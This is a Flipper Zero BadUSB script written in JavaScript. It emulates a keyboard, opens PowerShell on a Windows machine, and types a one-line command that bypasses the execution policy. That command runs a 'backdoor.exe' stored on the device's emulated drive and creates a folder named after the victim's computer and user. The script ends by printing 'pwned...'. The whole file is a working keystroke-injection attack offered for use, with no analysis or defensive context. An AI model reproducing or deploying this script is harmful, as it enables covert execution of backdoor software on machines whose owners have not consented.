// Title: Excecute EXE
// Author: BuffBaby253
// Description: Excecutes exe files from Flipper Zero in one script

// Assign Variables
let image = "/ext/apps_data/mass_storage/BackDoor.img";

let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Confirm Setup
print("Checking for Img...");
if (storage.exists(image)) {
    print ("Image Exists.");
}
else {
	print ("You need to create backdoor.exe in BackDoor.img ...");
	exit;
}

// Setup & Inject Keystrokes
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "r");
delay(300);
badusb.println("powershell");
badusb.press("ENTER");
delay(3000);
print("Running payload");
badusb.println("echo 'Please wait  .......!'; Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter;$drivePath = $DriveLetter + ':';$directoryPath = Join-Path -Path $drivePath -ChildPath $env:COMPUTERNAME-$env:USERNAME;New-Item -ItemType Directory -Path $directoryPath;$ScriptPath = $drivePath + '\\backdoor.exe';Set-ExecutionPolicy Bypass -Scope Process -Force;cd $directoryPath;& $ScriptPath 2>&1 ");
badusb.press("ENTER");
delay(2000);
badusb.quit();
delay(2000);
print("pwned...");

// Open Mass Storage 
usbdisk.start(image);

while (!usbdisk.wasEjected()) {
    delay(1000);
}
usbdisk.stop();
print("Done");
